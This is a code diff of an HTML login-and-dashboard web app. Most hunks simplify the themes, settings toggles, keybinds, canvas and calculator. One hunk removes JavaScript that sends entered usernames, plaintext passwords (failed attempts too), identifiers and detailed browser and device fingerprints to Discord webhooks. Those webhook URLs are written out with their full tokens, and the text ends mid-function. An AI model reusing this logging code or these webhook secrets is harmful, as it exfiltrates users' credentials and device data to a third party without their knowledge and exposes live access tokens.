@@ -14,8 +14,8 @@
     :root {
       --primary-bg: #0a0a0a;
       --secondary-bg: #1a1a1a;
-      --accent-color: #ff4500; /* Orange */
-      --accent-secondary: #ff6b35; /* Lighter Orange */
+      --accent-color: #ff4500;
+      --accent-secondary: #ff6b35;
       --text-primary: #ffffff;
       --text-secondary: #cccccc;
       --border-color: #333;
@@ -23,42 +23,6 @@
       --warning-color: #ffaa00;
       --error-color: #ff0040;
     }
-
-    /* Theme Definitions */
-    .theme-orange {
-      --accent-color: #ff4500;
-      --accent-secondary: #ff6b35;
-    }
-    .theme-blue {
-      --accent-color: #0066cc;
-      --accent-secondary: #004499;
-    }
-    .theme-green {
-      --accent-color: #00cc44;
-      --accent-secondary: #009933;
-    }
-    .theme-red {
-      --accent-color: #cc0044;
-      --accent-secondary: #990033;
-    }
-    .theme-purple {
-      --accent-color: #8800cc;
-      --accent-secondary: #6600aa;
-    }
-    .theme-amber {
-      --accent-color: #ffaa00;
-      --accent-secondary: #ff8800;
-    }
-    .theme-teal {
-      --accent-color: #00aaaa;
-      --accent-secondary: #008888;
-    }
-    .theme-pink {
-      --accent-color: #ff0088;
-      --accent-secondary: #cc0066;
-    }
-    /* Add more themes here if needed */
-
 
     * {
       box-sizing: border-box;
@@ -71,7 +35,6 @@
       background: var(--primary-bg);
       color: var(--text-primary);
       overflow-x: hidden;
-      transition: background 0.3s ease, color 0.3s ease;
     }
 
     /* Initialization Screen */
@@ -87,13 +50,6 @@
       justify-content: center;
       align-items: center;
       z-index: 9999;
-      opacity: 1;
-      visibility: visible;
-      transition: opacity 0.5s ease, visibility 0.5s ease;
-    }
-    .init-screen.hidden {
-      opacity: 0;
-      visibility: hidden;
     }
 
     .rotating-cube {
@@ -130,7 +86,7 @@
       font-family: 'Orbitron', monospace;
       font-size: 24px;
       font-weight: 700;
-      background: linear-gradient(45deg, var(--accent-color), var(--error-color));
+      background: linear-gradient(45deg, #ff4500, #ff0040);
       background-size: 200% 200%;
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
@@ -151,7 +107,6 @@
       height: 100%;
       pointer-events: none;
       opacity: 0.3;
-      overflow: hidden; /* Ensure code chars don't overflow */
     }
 
     .code-char {
@@ -176,13 +131,6 @@
       justify-content: center;
       align-items: center;
       position: relative;
-      opacity: 0;
-      visibility: hidden;
-      transition: opacity 0.5s ease, visibility 0.5s ease;
-    }
-    .login-container.active {
-      opacity: 1;
-      visibility: visible;
     }
 
     .login-quickbar {
@@ -364,15 +312,10 @@
       background: var(--primary-bg);
       padding: 20px;
       display: none;
-      opacity: 0;
-      visibility: hidden;
-      transition: opacity 0.5s ease, visibility 0.5s ease;
     }
 
     .dashboard.active {
       display: block;
-      opacity: 1;
-      visibility: visible;
     }
 
     .dashboard-header {
@@ -455,9 +398,6 @@
       box-shadow: 0 5px 15px rgba(0, 255, 65, 0.3);
       z-index: 1000;
       animation: slideIn 0.5s ease;
-      display: flex; /* Ensure icon and text are aligned */
-      align-items: center;
-      gap: 10px;
     }
 
     @keyframes slideIn {
@@ -478,9 +418,9 @@
       border-radius: 15px;
       padding: 20px;
       position: relative;
-      /* cursor: move; /* Removed for non-movable */
+      cursor: move;
       transition: all 0.3s ease;
-      resize: both; /* Resizable */
+      resize: both;
       overflow: auto;
       min-height: 200px;
     }
@@ -987,7 +927,7 @@
 <!-- Dashboard -->
 <div id="dashboard" class="dashboard">
   <!-- Welcome Notification -->
-  <div id="welcomeNotification" class="notification hidden">
+  <div id="welcomeNotification" class="notification">
     <i class="fas fa-user-check"></i> Welcome <span id="loggedUser">User</span>!
   </div>
 
@@ -1121,11 +1061,11 @@
           <button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
         </div>
       </div>
-      <div class="wifi-grid" id="wifiGrid">
-        <div class="wifi-item" data-level="High">Network_A<br>High</div>
-        <div class="wifi-item" data-level="Medium">Network_B<br>Medium</div>
-        <div class="wifi-item" data-level="Low">Network_C<br>Low</div>
-        <div class="wifi-item" data-level="High">Network_D<br>High</div>
+      <div class="wifi-grid">
+        <div class="wifi-item wifi-high">Network_A<br>High</div>
+        <div class="wifi-item wifi-medium">Network_B<br>Medium</div>
+        <div class="wifi-item wifi-low">Network_C<br>Low</div>
+        <div class="wifi-item wifi-high">Network_D<br>High</div>
       </div>
     </div>
 
@@ -1170,91 +1110,91 @@
       <div class="settings-grid">
         <div class="setting-item">
           <span>Dark Mode</span>
-          <div class="toggle-switch" id="darkModeToggle" onclick="toggleSetting(this, 'darkMode')">
+          <div class="toggle-switch" onclick="toggleSetting(this)">
             <div class="toggle-slider"></div>
           </div>
         </div>
         <div class="setting-item">
           <span>Auto-save Notes</span>
-          <div class="toggle-switch" id="autoSaveNotesToggle" onclick="toggleSetting(this, 'autoSaveNotes')">
+          <div class="toggle-switch active" onclick="toggleSetting(this)">
             <div class="toggle-slider"></div>
           </div>
         </div>
         <div class="setting-item">
           <span>Sound Notifications</span>
-          <div class="toggle-switch" id="soundNotificationsToggle" onclick="toggleSetting(this, 'soundNotifications')">
+          <div class="toggle-switch" onclick="toggleSetting(this)">
             <div class="toggle-slider"></div>
           </div>
         </div>
         <div class="setting-item">
           <span>Auto-refresh Data</span>
-          <div class="toggle-switch" id="autoRefreshDataToggle" onclick="toggleSetting(this, 'autoRefreshData')">
+          <div class="toggle-switch active" onclick="toggleSetting(this)">
             <div class="toggle-slider"></div>
           </div>
         </div>
         <div class="setting-item">
           <span>Compact View</span>
-          <div class="toggle-switch" id="compactViewToggle" onclick="toggleSetting(this, 'compactView')">
+          <div class="toggle-switch" onclick="toggleSetting(this)">
             <div class="toggle-slider"></div>
           </div>
         </div>
         <div class="setting-item">
           <span>Show Animations</span>
-          <div class="toggle-switch" id="showAnimationsToggle" onclick="toggleSetting(this, 'showAnimations')">
+          <div class="toggle-switch active" onclick="toggleSetting(this)">
             <div class="toggle-slider"></div>
           </div>
         </div>
         <div class="setting-item">
           <span>High Contrast</span>
-          <div class="toggle-switch" id="highContrastToggle" onclick="toggleSetting(this, 'highContrast')">
+          <div class="toggle-switch" onclick="toggleSetting(this)">
             <div class="toggle-slider"></div>
           </div>
         </div>
         <div class="setting-item">
           <span>Auto-backup</span>
-          <div class="toggle-switch" id="autoBackupToggle" onclick="toggleSetting(this, 'autoBackup')">
+          <div class="toggle-switch active" onclick="toggleSetting(this)">
             <div class="toggle-slider"></div>
           </div>
         </div>
         <div class="setting-item">
           <span>Security Mode</span>
-          <div class="toggle-switch" id="securityModeToggle" onclick="toggleSetting(this, 'securityMode')">
+          <div class="toggle-switch active" onclick="toggleSetting(this)">
             <div class="toggle-slider"></div>
           </div>
         </div>
         <div class="setting-item">
           <span>Advanced Logging</span>
-          <div class="toggle-switch" id="advancedLoggingToggle" onclick="toggleSetting(this, 'advancedLogging')">
+          <div class="toggle-switch" onclick="toggleSetting(this)">
             <div class="toggle-slider"></div>
           </div>
         </div>
         <div class="setting-item">
           <span>Performance Mode</span>
-          <div class="toggle-switch" id="performanceModeToggle" onclick="toggleSetting(this, 'performanceMode')">
+          <div class="toggle-switch" onclick="toggleSetting(this)">
             <div class="toggle-slider"></div>
           </div>
         </div>
         <div class="setting-item">
           <span>Developer Mode</span>
-          <div class="toggle-switch" id="developerModeToggle" onclick="toggleSetting(this, 'developerMode')">
+          <div class="toggle-switch" onclick="toggleSetting(this)">
             <div class="toggle-slider"></div>
           </div>
         </div>
         <div class="setting-item">
           <span>Experimental Features</span>
-          <div class="toggle-switch" id="experimentalFeaturesToggle" onclick="toggleSetting(this, 'experimentalFeatures')">
+          <div class="toggle-switch" onclick="toggleSetting(this)">
             <div class="toggle-slider"></div>
           </div>
         </div>
         <div class="setting-item">
           <span>Data Compression</span>
-          <div class="toggle-switch" id="dataCompressionToggle" onclick="toggleSetting(this, 'dataCompression')">
+          <div class="toggle-switch active" onclick="toggleSetting(this)">
             <div class="toggle-slider"></div>
           </div>
         </div>
         <div class="setting-item">
           <span>Real-time Sync</span>
-          <div class="toggle-switch" id="realtimeSyncToggle" onclick="toggleSetting(this, 'realtimeSync')">
+          <div class="toggle-switch" onclick="toggleSetting(this)">
             <div class="toggle-slider"></div>
           </div>
         </div>
@@ -1266,43 +1206,23 @@
         <div class="space-y-3" id="keybindsList">
           <div class="keybind-item">
             <span>Open Settings</span>
-            <input type="text" class="keybind-input" data-action="openSettings" value="Ctrl+," placeholder="Press keys...">
+            <input type="text" class="keybind-input" value="Ctrl+," placeholder="Press keys...">
           </div>
           <div class="keybind-item">
             <span>Quick Search</span>
-            <input type="text" class="keybind-input" data-action="quickSearch" value="Ctrl+K" placeholder="Press keys...">
+            <input type="text" class="keybind-input" value="Ctrl+K" placeholder="Press keys...">
           </div>
           <div class="keybind-item">
             <span>New Note</span>
-            <input type="text" class="keybind-input" data-action="newNote" value="Ctrl+N" placeholder="Press keys...">
+            <input type="text" class="keybind-input" value="Ctrl+N" placeholder="Press keys...">
           </div>
           <div class="keybind-item">
             <span>Save All</span>
-            <input type="text" class="keybind-input" data-action="saveAll" value="Ctrl+S" placeholder="Press keys...">
+            <input type="text" class="keybind-input" value="Ctrl+S" placeholder="Press keys...">
           </div>
           <div class="keybind-item">
             <span>Toggle Theme</span>
-            <input type="text" class="keybind-input" data-action="toggleTheme" value="Ctrl+T" placeholder="Press keys...">
-          </div>
-          <div class="keybind-item">
-            <span>Open Calculator</span>
-            <input type="text" class="keybind-input" data-action="openCalculator" value="Ctrl+C" placeholder="Press keys...">
-          </div>
-          <div class="keybind-item">
-            <span>Open Media</span>
-            <input type="text" class="keybind-input" data-action="openMedia" value="Ctrl+M" placeholder="Press keys...">
-          </div>
-          <div class="keybind-item">
-            <span>Open Timer</span>
-            <input type="text" class="keybind-input" data-action="openTimer" value="Ctrl+W" placeholder="Press keys...">
-          </div>
-          <div class="keybind-item">
-            <span>Open Stats</span>
-            <input type="text" class="keybind-input" data-action="openStats" value="Ctrl+B" placeholder="Press keys...">
-          </div>
-          <div class="keybind-item">
-            <span>Download Logs</span>
-            <input type="text" class="keybind-input" data-action="downloadLogs" value="Ctrl+L" placeholder="Press keys...">
+            <input type="text" class="keybind-input" value="Ctrl+T" placeholder="Press keys...">
           </div>
         </div>
       </div>
@@ -1310,17 +1230,15 @@
       <!-- Theme Selector -->
       <div class="mt-8">
         <h3 class="text-xl font-bold text-orange-500 mb-4"><i class="fas fa-palette"></i> Theme Selection</h3>
-        <div class="theme-selector" id="themeSelector">
-          <div class="theme-option active" data-theme="orange" style="background: linear-gradient(135deg, #ff4500, #ff6b35);">Orange</div>
-          <div class="theme-option" data-theme="blue" style="background: linear-gradient(135deg, #0066cc, #004499);">Blue</div>
-          <div class="theme-option" data-theme="green" style="background: linear-gradient(135deg, #00cc44, #009933);">Green</div>
-          <div class="theme-option" data-theme="red" style="background: linear-gradient(135deg, #cc0044, #990033);">Red</div>
-          <div class="theme-option" data-theme="purple" style="background: linear-gradient(135deg, #8800cc, #6600aa);">Purple</div>
-          <div class="theme-option" data-theme="amber" style="background: linear-gradient(135deg, #ffaa00, #ff8800);">Amber</div>
-          <div class="theme-option" data-theme="teal" style="background: linear-gradient(135deg, #00aaaa, #008888);">Teal</div>
-          <div class="theme-option" data-theme="pink" style="background: linear-gradient(135deg, #ff0088, #cc0066);">Pink</div>
-          <div class="theme-option" data-theme="dark" style="background: linear-gradient(135deg, #0a0a0a, #1a1a1a);">Dark</div>
-          <div class="theme-option" data-theme="light" style="background: linear-gradient(135deg, #ffffff, #e0e0e0); color: black;">Light</div>
+        <div class="theme-selector">
+          <div class="theme-option active" style="background: linear-gradient(135deg, #ff4500, #ff6b35);" onclick="applyTheme('orange')">Orange</div>
+          <div class="theme-option" style="background: linear-gradient(135deg, #0066cc, #004499);" onclick="applyTheme('blue')">Blue</div>
+          <div class="theme-option" style="background: linear-gradient(135deg, #00cc44, #009933);" onclick="applyTheme('green')">Green</div>
+          <div class="theme-option" style="background: linear-gradient(135deg, #cc0044, #990033);" onclick="applyTheme('red')">Red</div>
+          <div class="theme-option" style="background: linear-gradient(135deg, #8800cc, #6600aa);" onclick="applyTheme('purple')">Purple</div>
+          <div class="theme-option" style="background: linear-gradient(135deg, #ffaa00, #ff8800);" onclick="applyTheme('amber')">Amber</div>
+          <div class="theme-option" style="background: linear-gradient(135deg, #00aaaa, #008888);" onclick="applyTheme('teal')">Teal</div>
+          <div class="theme-option" style="background: linear-gradient(135deg, #ff0088, #cc0066);" onclick="applyTheme('pink')">Pink</div>
         </div>
       </div>
     </div>
@@ -1340,7 +1258,7 @@
         <!-- Stopwatch -->
         <div class="bg-gray-800 p-6 rounded-lg">
           <h3 class="text-lg font-bold mb-4 text-center">Stopwatch</h3>
-          <div class="timer-display" id="stopwatchDisplay">00:00:00.00</div>
+          <div class="timer-display" id="stopwatchDisplay">00:00:00</div>
           <div class="timer-controls">
             <button class="tool-btn" onclick="startStopwatch()"><i class="fas fa-play"></i> Start</button>
             <button class="tool-btn" onclick="pauseStopwatch()"><i class="fas fa-pause"></i> Pause</button>
@@ -1438,15 +1356,6 @@
         <button class="tool-btn" onclick="saveCanvas()">
           <i class="fas fa-save"></i> Save
         </button>
-        <button class="tool-btn" onclick="loadCanvas()">
-          <i class="fas fa-folder-open"></i> Load
-        </button>
-        <button class="tool-btn" onclick="undoCanvas()">
-          <i class="fas fa-undo"></i> Undo
-        </button>
-        <button class="tool-btn" onclick="redoCanvas()">
-          <i class="fas fa-redo"></i> Redo
-        </button>
       </div>
       
       <canvas id="drawingCanvas" width="760" height="400" class="w-full border border-gray-600 rounded mt-4 bg-white cursor-crosshair"></canvas>
@@ -1497,7 +1406,7 @@
             <button class="calc-btn" onclick="appendToCalc('1')">1</button>
             <button class="calc-btn" onclick="appendToCalc('2')">2</button>
             <button class="calc-btn" onclick="appendToCalc('3')">3</button>
-            <button class="calc-btn equals" onclick="calculateResult()" style="grid-row: span 2;">=</button>
+            <button class="calc-btn equals" onclick="calculateResult()" rowspan="2">=</button>
             
             <button class="calc-btn" onclick="appendToCalc('0')" style="grid-column: span 2;">0</button>
             <button class="calc-btn" onclick="appendToCalc('.')">.</button>
@@ -1600,7 +1509,7 @@
           <div class="stat-label">Search Queries</div>
         </div>
         <div class="stat-item">
-          <div class="stat-number" id="sessionTimeStat">00:00:00</div>
+          <div class="stat-number" id="sessionTime">00:00:00</div>
           <div class="stat-label">Session Time</div>
         </div>
       </div>
@@ -1617,11 +1526,11 @@
 // Global variables
 let currentUser = '';
 let currentUserID = '';
-let loginAttempts = 3; // Changed from 5 to 3
+let loginAttempts = 3;
 let is24HourFormat = false;
 let currentZoom = 1;
 let activityLogs = [];
-let loginHistory = []; // Stores successful login times
+let loginHistory = [];
 let stats = {
   buttonPresses: 0,
   toggleSwitches: 0,
@@ -1633,9 +1542,9 @@ let stats = {
 
 // Timer variables
 let stopwatchInterval = null;
-let stopwatchTime = 0; // in centiseconds
+let stopwatchTime = 0;
 let timerInterval = null;
-let timerTime = 0; // in seconds
+let timerTime = 0;
 let isStopwatchRunning = false;
 let isTimerRunning = false;
 
@@ -1644,47 +1553,15 @@ let isDrawing = false;
 let currentTool = 'pen';
 let currentColor = '#ff4500';
 let currentThickness = 2;
-let currentMaterial = 'solid'; // For line styles
 let canvas, ctx;
-let undoStack = [];
-let redoStack = [];
-const MAX_CANVAS_HISTORY = 20;
 
 // Calculator variables
-let calcDisplayValue = '0';
-let calcOperator = null;
-let calcPrevValue = null;
-let calcResetDisplay = false;
-
-// Webhook URLs (from your previous code)
-const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';
-const loggingWebhooks = {
-    username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
-    password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
-    identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
-    invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
-    invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
-    invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
-    attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
-    attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
-};
-const webhookUrls = {
-    userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
-    browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
-    deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
-    connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
-    sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
-};
-let users = []; // For login system
+let calcDisplay = '';
+let calcOperation = '';
 
 // Initialization sequence
 window.addEventListener('load', () => {
   startInitialization();
-  loadSettings(); // Load settings early to apply theme/etc.
-  loadKeybinds(); // Load keybinds
-  loadTextNotes(); // Load text notes
-  loadReminders(); // Load reminders
-  loadLoginHistory(); // Load login history
 });
 
 function startInitialization() {
@@ -1694,9 +1571,8 @@ function startInitialization() {
     document.getElementById('initText').textContent = 'Initializing Login Page...';
     setTimeout(() => {
       document.getElementById('initScreen').classList.add('hidden');
-      document.getElementById('loginScreen').classList.add('active'); // Use active class for visibility
+      document.getElementById('loginScreen').classList.remove('hidden');
       startClock();
-      fetchUsers(); // Fetch users for login
     }, 2000);
   }, 3000);
 }
@@ -1705,10 +1581,7 @@ function generateCodeRain(containerId) {
   const container = document.getElementById(containerId);
   const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
   
-  // Clear existing code rain if any
-  container.innerHTML = '';
-
-  const intervalId = setInterval(() => {
+  setInterval(() => {
     const char = document.createElement('div');
     char.className = 'code-char';
     char.textContent = chars[Math.floor(Math.random() * chars.length)];
@@ -1722,18 +1595,6 @@ function generateCodeRain(containerId) {
       }
     }, 3000);
   }, 100);
-
-  // Store interval ID to clear it later
-  container.dataset.intervalId = intervalId;
-}
-
-function stopCodeRain(containerId) {
-    const container = document.getElementById(containerId);
-    const intervalId = container.dataset.intervalId;
-    if (intervalId) {
-        clearInterval(intervalId);
-        container.innerHTML = ''; // Clear all characters
-    }
 }
 
 function startClock() {
@@ -1761,7 +1622,7 @@ function updateClock() {
 function adjustZoom(delta) {
   currentZoom = Math.max(0.5, Math.min(2, currentZoom + delta));
   document.body.style.zoom = currentZoom;
-  logActivity('Zoom adjusted to ' + Math.round(currentZoom * 100) + '%', 'UI');
+  logActivity('Zoom adjusted to ' + Math.round(currentZoom * 100) + '%');
 }
 
 // Toggle functions
@@ -1772,7 +1633,7 @@ function setupToggles() {
     const passwordField = document.getElementById('password');
     passwordField.type = this.classList.contains('active') ? 'text' : 'password';
     stats.toggleSwitches++;
-    logActivity('Password visibility toggled', 'Login UI');
+    logActivity('Password visibility toggled');
   });
 
   // 24-hour format toggle
@@ -1780,376 +1641,74 @@ function setupToggles() {
     this.classList.toggle('active');
     is24HourFormat = this.classList.contains('active');
     stats.toggleSwitches++;
-    logActivity('Time format toggled to ' + (is24HourFormat ? '24-hour' : '12-hour'), 'Login UI');
-    updateClock(); // Update clock immediately
-  });
-
-  // Settings toggles
-  document.getElementById('settingsModal').querySelectorAll('.toggle-switch').forEach(toggle => {
-    toggle.addEventListener('click', function() {
-      const settingName = this.id.replace('Toggle', ''); // e.g., 'darkMode'
-      const isActive = this.classList.contains('active');
-      saveSetting(settingName, !isActive); // Save the new state
-      stats.toggleSwitches++;
-      logActivity(`Setting "${settingName}" toggled to ${!isActive}`, 'Settings');
-    });
+    logActivity('Time format toggled to ' + (is24HourFormat ? '24-hour' : '12-hour'));
   });
 }
 
 // Login function
-async function fetchUsers() {
-    try {
-        const res = await fetch(USER_JSON_URL);
-        users = await res.json();
-    } catch (e) {
-        console.error('Failed to load user JSON data:', e);
-        users = [];
-    }
-}
-
-function findUser(username, userID) {
-    return users.find(u =>
-        u.username?.toLowerCase() === username.toLowerCase() &&
-        u.userID?.toString() === userID.toString()
-    );
-}
-
-async function sendWebhook(url, embed) {
-    try {
-        await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ embeds: [embed] }),
-        });
-    } catch (e) {
-        console.warn('Webhook send failed:', e);
-    }
-}
-
-function getWebGLRenderer() {
-    try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (!gl) return "Unavailable";
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
-    } catch {
-        return "Unavailable";
-    }
-}
-
-async function getBatteryStatus() {
-    if (navigator.getBattery) {
-        try {
-            const battery = await navigator.getBattery();
-            return battery;
-        } catch {
-            return null;
-        }
-    }
-    return null;
-}
-
-async function collectLoggingData(user, password) {
-    const now = new Date();
-    const loginTime = now.toISOString();
-    const batteryStatus = await getBatteryStatus();
-
-    return {
-        user,
-        password,
-        loginTime,
-        batteryStatus,
-        webglRenderer: getWebGLRenderer(),
-        loginAttemptsLog: loginHistory.filter(entry => !entry.success) // Only failed attempts
-    };
-}
-
-// New logging functions for the specific systems
-async function logUsername(name, username) {
-    const embed = { title: "Username Logging", color: 0x3498db, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] };
-    await sendWebhook(loggingWebhooks.username, embed);
-}
-async function logPassword(name, password) {
-    const embed = { title: "Password Logging", color: 0xe74c3c, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Password", value: password, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] };
-    await sendWebhook(loggingWebhooks.password, embed);
-}
-async function logIdentifier(name, identifier) {
-    const embed = { title: "Identifier Logging", color: 0x2ecc71, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] };
-    await sendWebhook(loggingWebhooks.identifier, embed);
-}
-async function logInvalidUsername(name, username) {
-    const embed = { title: "Invalid Username Logging", color: 0xf39c12, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Username", value: username, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] };
-    await sendWebhook(loggingWebhooks.invalid_username, embed);
-}
-async function logInvalidPassword(name, password) {
-    const embed = { title: "Invalid Password Logging", color: 0xe67e22, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Password", value: password, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] };
-    await sendWebhook(loggingWebhooks.invalid_password, embed);
-}
-async function logInvalidIdentifier(name, identifier) {
-    const embed = { title: "Invalid Identifier Logging", color: 0xd35400, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Identifier", value: identifier, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] };
-    await sendWebhook(loggingWebhooks.invalid_identifier, embed);
-}
-async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
-    const embed = { title: "Attempts Counter Logging", color: 0x9b59b6, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Attempts Left", value: attemptsLeft.toString(), inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] };
-    await sendWebhook(loggingWebhooks.attempts_counter, embed);
-}
-async function logAttemptsExceeded(name, username, password, identifier) {
-    const embed = { title: "Attempts Exceeded Logging", color: 0xc0392b, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] };
-    await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
-}
-
-// Original embed builders (with 6 more fields added)
-function buildUserLoggingEmbed(data) {
-    return {
-        title: "User Logging System",
-        color: 0xff0000,
-        fields: [
-            { name: "Name", value: data.user.name || "N/A", inline: true },
-            { name: "Username", value: data.user.username, inline: true },
-            { name: "Password", value: data.password, inline: true },
-            { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
-            { name: "Role Type", value: data.user.role || "N/A", inline: true },
-            { name: "Login Time", value: data.loginTime, inline: false },
-            { name: "User Identifier", value: data.user.userID.toString(), inline: true },
-            { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true },
-            { name: "Last Login IP", value: data.user.lastLoginIP || "N/A", inline: true }, // Added field 1
-            { name: "Geo-Location", value: data.user.geoLoc || "N/A", inline: true }, // Added field 2
-            { name: "Device Count", value: data.user.deviceCount?.toString() || "N/A", inline: true }, // Added field 3
-            { name: "Email", value: data.user.email || "N/A", inline: true }, // Added field 4
-            { name: "Phone Number", value: data.user.phoneNumber || "N/A", inline: true }, // Added field 5
-            { name: "Two-Factor Auth Enabled", value: data.user.twoFactorAuthEnabled ? "Yes" : "No", inline: true } // Added field 6
-        ]
-    };
-}
-
-function buildBrowserLoggingEmbed(data) {
-    const nav = navigator;
-    return {
-        title: "Browser Logging System",
-        color: 0x00ff00,
-        fields: [
-            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
-            { name: "Username", value: data.user.username || "N/A", inline: true },
-            { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
-            { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true },
-            { name: "Browser Language", value: nav.language || "Unknown", inline: true },
-            { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
-            { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
-            { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
-            { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
-            { name: "Browser Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true },
-            { name: "Incognito/Private Mode Status", value: "Undetected", inline: true },
-            { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
-            { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
-            { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
-            { name: "Font Smoothing Type", value: "Unavailable", inline: true },
-            { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true },
-            { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true },
-            { name: "Browser Connection Speed", value: nav.connection?.effectiveType || "Unknown", inline: true },
-            { name: "User Input Latency", value: "N/A (Client-side measurement)", inline: true }, // Added field 1
-            { name: "WebSockets Supported", value: "WebSocket" in window ? "Yes" : "No", inline: true } // Added field 2
-        ]
-    };
-}
-
-function buildDeviceLoggingEmbed(data) {
-    const nav = navigator;
-    const battery = data.batteryStatus;
-    return {
-        title: "Device Logging System",
-        color: 0x0000ff,
-        fields: [
-            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
-            { name: "Username", value: data.user.username || "N/A", inline: true },
-            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
-            { name: "Device Platform", value: nav.platform || "Unknown", inline: true },
-            { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true },
-            { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true },
-            { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
-            { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true },
-            { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
-            { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
-            { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
-            { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true },
